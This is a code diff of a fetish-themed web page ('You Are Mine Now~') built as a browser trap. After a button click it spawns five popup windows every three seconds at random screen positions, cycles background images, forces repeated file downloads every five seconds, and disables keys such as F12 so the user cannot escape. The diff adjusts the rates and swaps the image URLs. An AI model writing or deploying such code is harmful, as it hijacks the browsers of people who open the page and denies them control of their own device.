@@ -10,7 +10,6 @@
       color: hotpink;
       font-family: Arial, sans-serif;
       text-align: center;
-      overflow: hidden;
       background-size: cover;
       background-position: center;
       height: 100vh;
@@ -18,8 +17,6 @@
     }
     h1 {
       font-size: 3em;
-      position: relative;
-      z-index: 10;
       padding-top: 20vh;
     }
     #startBtn {
@@ -36,41 +33,39 @@
 </head>
 <body>
   <h1>You're falling deeper under my spell~ 💕</h1>
-  <button id="startBtn" onclick="startTrap()">Submit to Me</button>
+  <button id="startBtn">Submit to Me</button>
 
   <script>
     const images = [
-      "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20(10).png",
-      "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20(11).png",
-      "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20(12).png",
-      "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20(13).png",
-      "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20(14).png",
-      "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20(15).png",
-      "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20(16).png",
-      "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20(17).png",
-      "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20(18).png",
-      "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20(19).png",
-      "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20(20).png",
-      "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20(21).png",
-      "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20(22).png",
-      "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20(23).png",
-      "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20(24).png",
-      "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20(3).png",
-      "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20(4).png",
-      "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20(5).png",
-      "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20(6).png",
-      "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20(7).png",
-      "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20(74).png",
-      "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20(75).png",
-      "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20(76).png",
-      "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20(79).png",
-      "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20(8).png",
-      "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20(80).png",
-      "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20(81).png",
-      "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20(83).png",
-      "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20(84).png",
-      "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20(9).png",
-      "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image.png"
+      "https://github.com/velvettemptress/mindtrap/blob/main/Untitled%20(1152%20x%201728%20px).png?raw=true",
+      "https://github.com/velvettemptress/mindtrap/blob/main/WhatsApp%20Image%202025-03-19%20at%2021.32.43.jpeg?raw=true",
+      "https://github.com/velvettemptress/mindtrap/blob/main/undefined_image%20(11).png?raw=true",
+      "https://github.com/velvettemptress/mindtrap/blob/main/undefined_image%20(12).png?raw=true",
+      "https://github.com/velvettemptress/mindtrap/blob/main/undefined_image%20(13).png?raw=true",
+      "https://github.com/velvettemptress/mindtrap/blob/main/undefined_image%20(14).png?raw=true",
+      "https://github.com/velvettemptress/mindtrap/blob/main/undefined_image%20(15).png?raw=true",
+      "https://github.com/velvettemptress/mindtrap/blob/main/undefined_image%20(16).png?raw=true",
+      "https://github.com/velvettemptress/mindtrap/blob/main/undefined_image%20(19).png?raw=true",
+      "https://github.com/velvettemptress/mindtrap/blob/main/undefined_image%20(20).png?raw=true",
+      "https://github.com/velvettemptress/mindtrap/blob/main/undefined_image%20(21).png?raw=true",
+      "https://github.com/velvettemptress/mindtrap/blob/main/undefined_image%20(22).png?raw=true",
+      "https://github.com/velvettemptress/mindtrap/blob/main/undefined_image%20(24).png?raw=true",
+      "https://github.com/velvettemptress/mindtrap/blob/main/undefined_image%20(3).png?raw=true",
+      "https://github.com/velvettemptress/mindtrap/blob/main/undefined_image%20(9).png?raw=true",
+      "https://github.com/velvettemptress/mindtrap/blob/main/undefined_image%20(83).png?raw=true",
+      "https://github.com/velvettemptress/mindtrap/blob/main/undefined_image%20(79).png?raw=true",
+      "https://github.com/velvettemptress/mindtrap/blob/main/undefined_image%20(7).png?raw=true",
+      "https://github.com/velvettemptress/mindtrap/blob/main/undefined_image%20(6).png?raw=true",
+      "https://github.com/velvettemptress/mindtrap/blob/main/undefined_image%20(56).png?raw=true",
+      "https://github.com/velvettemptress/mindtrap/blob/main/undefined_image%20(55).png?raw=true",
+      "https://github.com/velvettemptress/mindtrap/blob/main/undefined_image%20(52).png?raw=true",
+      "https://github.com/velvettemptress/mindtrap/blob/main/20250516_0814_image.png?raw=true",
+      "https://github.com/velvettemptress/mindtrap/blob/main/20250516_0815_image.png?raw=true",
+      "https://github.com/velvettemptress/mindtrap/blob/main/20250516_1234_image(1).png?raw=true",
+      "https://github.com/velvettemptress/mindtrap/blob/main/20250516_1235_image.png?raw=true",
+      "https://raw.githubusercontent.com/velvettemptress/mindtrap/84827059fcec2bf91379c11258d9c63788d73f62/20250516_1235_image(1).png",
+      "https://raw.githubusercontent.com/velvettemptress/mindtrap/84827059fcec2bf91379c11258d9c63788d73f62/20250516_1235_image(2).png"
+      // ... you can add more as needed
     ];
 
     let usedIndexes = [];
@@ -85,17 +80,23 @@
       return images[index];
     }
 
-    function goFullScreen() {
-      const el = document.documentElement;
-      if (el.requestFullscreen) el.requestFullscreen();
-      else if (el.mozRequestFullScreen) el.mozRequestFullScreen();
-      else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
-      else if (el.msRequestFullscreen) el.msRequestFullscreen();
+    function openPopup(url) {
+      const width = 400;
+      const height = 400;
+      const left = Math.floor(Math.random() * (window.screen.width - width));
+      const top = Math.floor(Math.random() * (window.screen.height - height));
+      const features = `width=${width},height=${height},left=${left},top=${top}`;
+      const popup = window.open("", "_blank", features);
+
+      if (popup) {
+        popup.document.write(`<img src="${url}" width="100%" height="100%">`);
+        popup.document.title = "You Belong to Velvet Temptress";
+        popup.document.body.style.margin = "0";
+        popup.document.body.style.backgroundColor = "black";
+      }
     }
 
     function startTrap() {
-      goFullScreen();
-
       document.body.innerHTML = "<h1>You Are Mine Now~ 💕</h1>";
 
       // Change background every 3s
@@ -104,24 +105,15 @@
         document.body.style.backgroundImage = `url(${url})`;
       }, 3000);
 
-      // Popups
-      function openPopup() {
-        const url = getRandomImage();
-        const left = Math.random() * screen.width;
-        const top = Math.random() * screen.height;
-        const popup = window.open("", "", `width=400,height=400,left=${left},top=${top}`);
-        if (popup) {
-          popup.document.write(`<img src="${url}" width="100%" height="100%">`);
-        }
-      }
-
-      // 2 popups every 2s
+      // Open up to 5 popups at once every 3s (if allowed)
       setInterval(() => {
-        openPopup();
-        openPopup();
-      }, 2000);
+        for (let i = 0; i < 5; i++) {
+          const url = getRandomImage();
+          openPopup(url);
+        }
+      }, 3000);
 
-      // Auto-downloads every 3s
+      // Auto-download every 5s
       setInterval(() => {
         const url = getRandomImage();
         const link = document.createElement("a");
@@ -130,10 +122,12 @@
         document.body.appendChild(link);
         link.click();
         document.body.removeChild(link);
-      }, 3000);
+      }, 5000);
     }
 
-    // Prevent user from escaping
+    document.getElementById("startBtn").addEventListener("click", startTrap);
+
+    // Disable escape keys
     document.addEventListener('keydown', function(event) {
       if (
         event.key === "F12" ||
